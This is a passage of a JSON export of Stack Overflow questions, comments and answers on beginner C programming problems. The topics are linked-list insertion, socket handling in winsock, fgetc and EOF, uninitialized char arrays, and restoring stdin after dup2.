"https://lh3.googleusercontent.com/-40gj_QDvDAo/AAAAAAAAAAI/AAAAAAAAAAA/AGDgw-iX1B2fE1nKpy-SECu2nJ3fCoEQIg/mo/photo.jpg?sz=128", "display_name": "Elad Kobi", "link": "https://stackoverflow.com/users/10764709/elad-kobi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 99, "favorite_count": 0, "answer_count": 2, "score": 0, "last_activity_date": 1545820821, "creation_date": 1545768527, "last_edit_date": 1545800582, "question_id": 53925334, "link": "https://stackoverflow.com/questions/53925334/adding-a-node-to-a-linked-list", "title": "Adding a node to a linked list", "body": "<p>I am trying to write a function that gets the head of the linked list , the tail of the linked list, the place to add the node (n), number and a price.</p>\n\n<p>Each node in the linked list contains a number which is also the place of the node in the list.\nSomething here dosen't work, it keeps placing the new node in the first postion of the linked list for some reason. Thank's for the help.\nHere is a photo of how it spots to print:</p>\n\n<p><a href=\"https://i.imgur.com/LvHMKlu.png\" rel=\"nofollow noreferrer\"><img src=\"https://i.imgur.com/LvHMKlu.png\" alt=\"image\"></a></p>\n\n<pre><code>void AddNewItem(PItem *head, PItem *tail, int n, int a, float b){\n    PItem temp = *head, curr = *head;\n    temp-&gt;num = a;\n    temp-&gt;price = b;\n    temp = (PItem*)malloc(sizeof(PItem));\n\n    while (n &lt; temp-&gt;num) {\n        temp = temp-&gt;next;\n        curr = curr-&gt;next;\n    }\n    temp-&gt;next = curr-&gt;next;\n    curr-&gt;next = temp;\n}\n</code></pre>\n\n<p>Here is the struct:</p>\n\n<pre><code>typedef struct Item\n{\n    int num;\n    float price;\n    struct Item* next;\n}*PItem;\n</code></pre>\n"}, {"tags": ["c", "multithreading", "sockets", "winsock"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 1, "creation_date": 1545767113, "post_id": 53925175, "comment_id": 94691902, "body": "One common way is to not use arrays but lists or other container data types. Another simple way (using an array) is to use <code>INVALID_SOCKET</code> for sockets that are not used, and then loop over the whole array checking for valid sockets when needed."}, {"owner": {"reputation": 4739, "user_id": 4745612, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/1b8f0eb3ff209075ac07aabc64d2bde4?s=128&d=identicon&r=PG&f=1", "display_name": "Michi", "link": "https://stackoverflow.com/users/4745612/michi"}, "edited": false, "score": 0, "creation_date": 1545768083, "post_id": 53925175, "comment_id": 94692103, "body": "Check this <a href=\"https://pastebin.com/raw/ZqMT7Spp\" rel=\"nofollow noreferrer\">DEMO</a> how to handle those connections."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545782619, "post_id": 53925175, "comment_id": 94694314, "body": "When a client connects, the server gets a socket number (typically returned from the <code>accept()</code> statement)  That socket number (doesn&#39;t matter if it is &#39;ordered&#39; or not) is what is needed to communicate with that client.  In general, have a separate thread for each client.  The thread handles ALL the communication with that client.  When the client disconnects, then just kill that thread.  Then no need to track all the connections."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545782631, "post_id": 53925175, "comment_id": 94694316, "body": "BTW: since starting and killing a thread takes a lot of time, May I suggest using a <a href=\"http://faculty.washington.edu/jstraub/isilon/isilon2/Unit7/threadpool/doc/html/example_8c-example.html\" rel=\"nofollow noreferrer\">thread pool</a>"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545783275, "post_id": 53925175, "comment_id": 94694411, "body": "please post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> so we can reproduce the problem thereby we can help you debug it"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545872630, "post_id": 53925175, "comment_id": 94717228, "body": "I&#39;m thinking we have all said: Do not number the clients, rather, just use the <code>socket</code> associated with that client."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545873813, "post_id": 53925175, "comment_id": 94717390, "body": "If you just wanted an opinion:  stackoverflow is NOT the place to post the question."}, {"owner": {"reputation": 45, "user_id": 10830882, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/851aecb8e811579fa899c2f0d088660b?s=128&d=identicon&r=PG&f=1", "display_name": "DoJo", "link": "https://stackoverflow.com/users/10830882/dojo"}, "edited": false, "score": 0, "creation_date": 1545878475, "post_id": 53925175, "comment_id": 94718032, "body": "My bad, to be honest i tried to get an opinion including an example."}], "owner": {"reputation": 45, "user_id": 10830882, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/851aecb8e811579fa899c2f0d088660b?s=128&d=identicon&r=PG&f=1", "display_name": "DoJo", "link": "https://stackoverflow.com/users/10830882/dojo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 44, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1545766950, "creation_date": 1545766950, "question_id": 53925175, "link": "https://stackoverflow.com/questions/53925175/handle-logout-and-sorting-in-an-array-of-socket-threads", "title": "Handle logout and sorting in an array of socket threads", "body": "<p>Ii have a server in c (winsock) for multiple connections using ThreadCreate() and i store all the new client sockets in an array. Handle peers[10]. By now when i receive data from 1 peer i only loop throug the array and send the data on every socket. But now i face 2 problems</p>\n\n<ol>\n<li><p>when a new peer connects i just count up an integer, but when it closes the connection i must reorder the HANDLE array to not get over MAX_CONNECTIONS very early</p></li>\n<li><p>When (later on) i want send data to a specific socket i need something like a numbering system</p></li>\n</ol>\n\n<p>My questions:</p>\n\n<ol>\n<li><p>What is the best way to solve problem 1? the ordering when connections starts/stops</p></li>\n<li><p>Is it ok to just associate every peer with an integer and select it based on that or maybe its ip?</p></li>\n</ol>\n\n<p>Thanks</p>\n"}, {"tags": ["c", "eof", "fgetc"], "comments": [{"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 1, "creation_date": 1545765017, "post_id": 53924969, "comment_id": 94691459, "body": "<code>int p;</code> instead of <code>char p;</code>"}, {"owner": {"reputation": 9095, "user_id": 8542346, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/11b206b49cec657d28a5876f8330780e?s=128&d=identicon&r=PG&f=1", "display_name": "H.S.", "link": "https://stackoverflow.com/users/8542346/h-s"}, "edited": false, "score": 1, "creation_date": 1545765038, "post_id": 53924969, "comment_id": 94691464, "body": "<code>fgetc()</code> returns <code>int</code> and not <code>char</code>."}, {"owner": {"reputation": 767, "user_id": 3002496, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/SRvSe.png?s=128&g=1", "display_name": "Sunspawn", "link": "https://stackoverflow.com/users/3002496/sunspawn"}, "edited": false, "score": 0, "creation_date": 1545765351, "post_id": 53924969, "comment_id": 94691525, "body": "Is that really it? Gonna check real quick, feeling mighty dumb right now."}, {"owner": {"reputation": 767, "user_id": 3002496, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/SRvSe.png?s=128&g=1", "display_name": "Sunspawn", "link": "https://stackoverflow.com/users/3002496/sunspawn"}, "edited": false, "score": 0, "creation_date": 1545765473, "post_id": 53924969, "comment_id": 94691549, "body": "Nope, still not getting to the last line."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 1, "creation_date": 1545765761, "post_id": 53924969, "comment_id": 94691604, "body": "The exact code in the (edited) question works fine when copypasted inside <code>int main() { \u2026 }</code> and the input is piped from <code>echo x</code>."}, {"owner": {"reputation": 767, "user_id": 3002496, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/SRvSe.png?s=128&g=1", "display_name": "Sunspawn", "link": "https://stackoverflow.com/users/3002496/sunspawn"}, "edited": false, "score": 0, "creation_date": 1545765928, "post_id": 53924969, "comment_id": 94691641, "body": "Strange, I am getting crashes there when using the feature of eclipse that replaces console input with a text file."}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 2, "creation_date": 1545766044, "post_id": 53924969, "comment_id": 94691668, "body": "Try directly from the command-line."}, {"owner": {"reputation": 767, "user_id": 3002496, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/SRvSe.png?s=128&g=1", "display_name": "Sunspawn", "link": "https://stackoverflow.com/users/3002496/sunspawn"}, "edited": false, "score": 0, "creation_date": 1545766545, "post_id": 53924969, "comment_id": 94691806, "body": "Okay, it works. Seems the issue is with the eclipse side. Thanks a ton!"}, {"owner": {"reputation": 37414, "user_id": 204883, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba29060be0758fa6537ff3d768a91757?s=128&d=identicon&r=PG", "display_name": "Arkku", "link": "https://stackoverflow.com/users/204883/arkku"}, "edited": false, "score": 0, "creation_date": 1545771098, "post_id": 53924969, "comment_id": 94692660, "body": "Eclipse sucks.&lt;/flame&gt; =)"}], "owner": {"reputation": 767, "user_id": 3002496, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/SRvSe.png?s=128&g=1", "display_name": "Sunspawn", "link": "https://stackoverflow.com/users/3002496/sunspawn"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 64, "favorite_count": 0, "closed_date": 1545765019, "answer_count": 0, "score": 0, "last_activity_date": 1545765790, "creation_date": 1545764876, "last_edit_date": 1545765790, "question_id": 53924969, "link": "https://stackoverflow.com/questions/53924969/getc-crashes-when-trying-to-read-after-the-last-n-in-a-file", "closed_reason": "Duplicate", "title": "getc() crashes when trying to read after the last \\n in a file", "body": "<p>I have a an issue where <code>fgetc()</code> would crash upon trying to read beyond the last character in a stream (there is no file being opened, I am redirecting a text file to <code>stdin</code>). In the following code, with a file that contains a single character and a newline, it does not get to the \"something\" at the end - it does not even return <code>EOF</code>, merely quits.</p>\n\n<p>I am somewhat at my wits' end here, really not sure what I am doing wrong. It's probably me not knowing something critical, but I have no idea what it is.</p>\n\n<p>I did try to check with <code>feof()</code>, but it did not even get to it.</p>\n\n<pre><code>int p;\nwhile ( (p = fgetc(stdin)) != EOF ) {\n    printf(\"%c\", p);\n}\nprintf(\"something.\\n\");\n</code></pre>\n\n<p>I tried changing the previous <code>char p</code> to <code>int p</code>, to no avail.</p>\n"}, {"tags": ["c", "arrays", "char"], "comments": [{"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 1, "creation_date": 1545764334, "post_id": 53924881, "comment_id": 94691317, "body": "Since the other elements of the array are not initialized you are invoking undefined behavior."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1545764426, "post_id": 53924881, "comment_id": 94691335, "body": "@Osiris \u201cIf an object that has automatic storage duration is not initialized explicitly, its value is indeterminate.\u201d. It is not really UB"}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545764644, "post_id": 53924881, "comment_id": 94691382, "body": "@Ctx Yes, but i think accessing it is UB."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1545764733, "post_id": 53924881, "comment_id": 94691404, "body": "@Osiris No, it isn&#39;t, that&#39;s what I tried to tell you"}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545764832, "post_id": 53924881, "comment_id": 94691429, "body": "@Ctx In the standard <a href=\"http://www.open-std.org/jtc1/sc22/wg14/www/docs/n1570.pdf\" rel=\"nofollow noreferrer\">C11 \u2013 ISO/IEC 9899:2011</a> in section <code>J.2 Undefined Behavior</code> it is written <code>the   value   of   an   object   with   automatic   storage   duration   is   used   while   it   is indeterminate (6.2.4, 6.7.9, 6.8).</code>"}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545764864, "post_id": 53924881, "comment_id": 94691433, "body": "@Ctx So it is undefined behavior."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1545764985, "post_id": 53924881, "comment_id": 94691452, "body": "@Osiris Since char does not have a trap representation, it isn&#39;t"}, {"owner": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545765180, "post_id": 53924881, "comment_id": 94691495, "body": "@Ctx It is clearly stated in the standard that it is, there is no exception for types that do not have a trap representation."}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "reply_to_user": {"reputation": 2723, "user_id": 9017315, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3229c3b31dc467c858d3d27f88c41c11?s=128&d=identicon&r=PG&f=1", "display_name": "Osiris", "link": "https://stackoverflow.com/users/9017315/osiris"}, "edited": false, "score": 0, "creation_date": 1545765488, "post_id": 53924881, "comment_id": 94691553, "body": "@Osiris As you might know, the Annex J is not normative."}], "answers": [{"tags": [], "owner": {"reputation": 31, "user_id": 8144255, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-EeuRhg7a7Bg/AAAAAAAAAAI/AAAAAAAABVY/YvhwiiK7hmM/photo.jpg?sz=128", "display_name": "Othman Khamra", "link": "https://stackoverflow.com/users/8144255/othman-khamra"}, "is_accepted": false, "score": 2, "last_activity_date": 1545764571, "creation_date": 1545764571, "answer_id": 53924929, "question_id": 53924881, "link": "https://stackoverflow.com/questions/53924881/printing-char-array-in-c/53924929#53924929", "title": "Printing char array in C", "body": "<p>The problem is that you didn't initialise your array. In order to get that output you can do it in this way:</p>\n\n<pre><code>char s[10];\n\nfor(int i=0;i&lt;10;i++)\n{\n    s[i] = ' ';\n}\ns[1]='a';\ns[6]='4';\nfor(int i=0;i&lt;10;i++)\n    printf(\"%c\",s[i]);\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 57, "user_id": 10459753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32585b8171776480a44271dfcd56638d?s=128&d=identicon&r=PG&f=1", "display_name": "echoaman", "link": "https://stackoverflow.com/users/10459753/echoaman"}, "edited": false, "score": 0, "creation_date": 1545765364, "post_id": 53924949, "comment_id": 94691529, "body": "Understood. Also,can you explain why did the output change when I modified the first code?"}, {"owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "reply_to_user": {"reputation": 57, "user_id": 10459753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32585b8171776480a44271dfcd56638d?s=128&d=identicon&r=PG&f=1", "display_name": "echoaman", "link": "https://stackoverflow.com/users/10459753/echoaman"}, "edited": false, "score": 0, "creation_date": 1545765785, "post_id": 53924949, "comment_id": 94691610, "body": "@Aman you are trying to print uninitialized array elements in both cases, it causes <a href=\"https://en.wikipedia.org/wiki/Undefined_behavior\" rel=\"nofollow noreferrer\">UB</a>. Also you can&#39;t assume every time you it produces same intermediate values."}], "tags": [], "owner": {"reputation": 11619, "user_id": 5346306, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/BsACH.jpg?s=128&g=1", "display_name": "Achal", "link": "https://stackoverflow.com/users/5346306/achal"}, "is_accepted": false, "score": 2, "last_activity_date": 1545766769, "last_edit_date": 1545766769, "creation_date": 1545764694, "answer_id": 53924949, "question_id": 53924881, "link": "https://stackoverflow.com/questions/53924881/printing-char-array-in-c/53924949#53924949", "title": "Printing char array in C", "body": "<p>Here </p>\n\n<pre><code>char s[10]; /* uninitialized array */ \n</code></pre>\n\n<p>character array <code>s</code> is not initialized &amp; default <code>s</code> elements contain garbage data as it has automatic storage duration and you have assigned values to only <code>s[1]</code> and <code>s[6]</code>. </p>\n\n<p>Hence array elements except <code>s[1]</code> and <code>s[6]</code> contains garbage data &amp; printing their value is not guaranteed to be same Every time as you have shown.</p>\n\n<p>To avoid this you can initialize array like this</p>\n\n<pre><code>char s[10] = \"\"; /* initialize all array elements  with 0 */\n</code></pre>\n\n<p>while declaring itself.</p>\n"}, {"tags": [], "owner": {"reputation": 3560, "user_id": 5550963, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7jAip.png?s=128&g=1", "display_name": "CEPB", "link": "https://stackoverflow.com/users/5550963/cepb"}, "is_accepted": true, "score": 1, "last_activity_date": 1545785868, "last_edit_date": 1545785868, "creation_date": 1545765249, "answer_id": 53925004, "question_id": 53924881, "link": "https://stackoverflow.com/questions/53924881/printing-char-array-in-c/53925004#53925004", "title": "Printing char array in C", "body": "<p>You got to understand behavior behind your program. So when you load your program it is given <code>N</code> bytes in memory and that <code>N</code> bytes gets reused many times and not erased. So in first instance your program have loaded some data into spot where <code>s[0]</code> would later reside, where as in second something was loaded where <code>s[2]</code> as well. That is why you are getting different output in these 2 cases.</p>\n\n<p>So to sum it up: Your array is not initiated to <code>0</code> or <code></code> unless you do it your self, it is given memory that have been previously used by the same program. To do it as it was pointed before you have to do this:</p>\n\n<pre><code>char s[10] = \"          \";\n....\n</code></pre>\n\n<p>One more thing I see is you were not expecting space before <code>a</code>, in C/C++/Java array indexes start at <code>0</code>. So if you do:</p>\n\n<pre><code>char s[4];\n\ns[1] = 'a';\ns[2] = 'b';\ns[3] = '\\0';\n\nprint (\"%s\", s);\n</code></pre>\n\n<p>you would probably get:</p>\n\n<pre><code>@ab\n</code></pre>\n\n<p><code>@</code> comes up because there was nothing written by you as programmer in memory spot where <code>s[0]</code> resides.</p>\n\n<p>Note that every time you have string in <code>C</code> you have to terminate it with '\\0' character.</p>\n"}], "owner": {"reputation": 57, "user_id": 10459753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/32585b8171776480a44271dfcd56638d?s=128&d=identicon&r=PG&f=1", "display_name": "echoaman", "link": "https://stackoverflow.com/users/10459753/echoaman"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 4492, "favorite_count": 0, "accepted_answer_id": 53925004, "answer_count": 3, "score": 1, "last_activity_date": 1545785868, "creation_date": 1545764213, "question_id": 53924881, "link": "https://stackoverflow.com/questions/53924881/printing-char-array-in-c", "title": "Printing char array in C", "body": "<pre><code>void main(){\nchar s[10];\n\ns[1]='a';\ns[6]='4';\nfor(int i=0;i&lt;10;i++)\n    printf(\"%c\",s[i]);\n}\n</code></pre>\n\n<p>I have this simple program. It gives the following output:</p>\n\n<pre><code>@aO   4\n</code></pre>\n\n<p>If I change the above code to:</p>\n\n<pre><code>void main(){\nchar s[10];\n\ns[1]='a';\ns[6]='4';\nfor(int i=0;i&lt;10;i++)\n    printf(\"%c\",s[i]);\n\nprintf(\"\\n\");\n\nfor(int i=0;i&lt;10;i++)\n    printf(\"%c\",s[i]);\n\n}\n</code></pre>\n\n<p>Output changes to:</p>\n\n<pre><code>@a\u0010@ 4\n@a\u0010@ 4\n</code></pre>\n\n<p>There are actually 2 cubes containing 4 numbers (1 number in each quadrant of the cube) between 'a' and the '@' after a but for some reason they are not showing.Please try the above codes in code blocks if I do not make sense to you.</p>\n\n<p>I was expecting the output to be <code>a    4</code>  by the first code.Why is it not so? Also, why did the output change when I added more code? I was expecting the output to be:</p>\n\n<pre><code>a    4\na    4\n</code></pre>\n"}, {"tags": ["c", "unix", "file-descriptor", "dup2"], "comments": [{"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 2, "creation_date": 1545763770, "post_id": 53924800, "comment_id": 94691186, "body": "Simply <code>dup2()</code> stdin to a temporary filedescriptor first and <code>dup2()</code> it back again later"}, {"owner": {"reputation": 149, "user_id": 7902810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653be60b973fd63c21ef8f9c0357e950?s=128&d=identicon&r=PG&f=1", "display_name": "Yi Lin Liu", "link": "https://stackoverflow.com/users/7902810/yi-lin-liu"}, "reply_to_user": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 0, "creation_date": 1545763935, "post_id": 53924800, "comment_id": 94691229, "body": "@Ctx Is it possible to keep stdin without temporary duplicate it?"}, {"owner": {"reputation": 17054, "user_id": 5636775, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/GC9DT.gif?s=128&g=1", "display_name": "Ctx", "link": "https://stackoverflow.com/users/5636775/ctx"}, "edited": false, "score": 1, "creation_date": 1545763987, "post_id": 53924800, "comment_id": 94691239, "body": "Not &quot;keep&quot; it, you could reopen it if it is possible. Depending on what your stdin is, this might be not possible however."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1545930783, "post_id": 53924800, "comment_id": 94735548, "body": "The &#39;exec..()` commands do not return, unless they failed.  So the only reasonable statements after an exec command are: <code>perror( &quot;exec.. failed&quot; );</code> followed by  <code>exit( EXIT_FAILURE );</code>"}], "answers": [{"comments": [{"owner": {"reputation": 149, "user_id": 7902810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653be60b973fd63c21ef8f9c0357e950?s=128&d=identicon&r=PG&f=1", "display_name": "Yi Lin Liu", "link": "https://stackoverflow.com/users/7902810/yi-lin-liu"}, "edited": false, "score": 0, "creation_date": 1545764178, "post_id": 53924853, "comment_id": 94691282, "body": "Without duplicate the stdin to temporary fd, would you be able to reopen stdin?"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 149, "user_id": 7902810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653be60b973fd63c21ef8f9c0357e950?s=128&d=identicon&r=PG&f=1", "display_name": "Yi Lin Liu", "link": "https://stackoverflow.com/users/7902810/yi-lin-liu"}, "edited": false, "score": 1, "creation_date": 1545764294, "post_id": 53924853, "comment_id": 94691307, "body": "In general, no.  The original standard input might be a pipe, a socket, or some other fancy and ephemeral file type, which cannot be reopened.  Plus you don&#39;t have a name to (re)open it with.  After the <code>dup2(p, STDIN_FILENO);</code> operation succeeds, <code>&#47;dev&#47;stdin</code> is no help; it yields the file that <code>p</code> was opened for, not the original standard input."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 149, "user_id": 7902810, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/653be60b973fd63c21ef8f9c0357e950?s=128&d=identicon&r=PG&f=1", "display_name": "Yi Lin Liu", "link": "https://stackoverflow.com/users/7902810/yi-lin-liu"}, "edited": false, "score": 1, "creation_date": 1545768845, "post_id": 53924853, "comment_id": 94692230, "body": "Also, while I think about it, note that you may run into problems with buffering of input if you dink with file descriptor while the standard I/O library has some input read from the kernel but not delivered to the application.  (Similar problems could occur with outputs too.)"}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": true, "score": 5, "last_activity_date": 1545764249, "last_edit_date": 1545764249, "creation_date": 1545763945, "answer_id": 53924853, "question_id": 53924800, "link": "https://stackoverflow.com/questions/53924800/how-to-recover-stdin-overwritten-by-dup2/53924853#53924853", "title": "How to recover stdin overwritten by dup2?", "body": "<p>You can't recover the original once it has been overwritten (closed).  What you can do is save a copy of it before you overwrite it (which requires planning ahead, of course):</p>\n\n<pre><code>int old_stdin = dup(STDIN_FILENO);\n\ndup2(p, STDIN_FILENO);\nclose(p);               // Usually correct when you dup to a standard I/O file descriptor.\n\n\u2026code using stdin\u2026\n\ndup2(old_stdin, STDIN_FILENO);\nclose(old_stdin);       // Probably correct\nscanf(\u2026);\n</code></pre>\n\n<p>However, your code mentions <code>exec(\u2026some commands\u2026);</code> \u2014 if that is one of the POSIX <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/execve.html\" rel=\"nofollow noreferrer\"><code>execve()</code></a> family of functions, then you won't reach the <code>scanf()</code> (or the second <code>dup2()</code>) call unless the <code>exec*()</code> call fails.</p>\n"}], "owner": {"reputation": 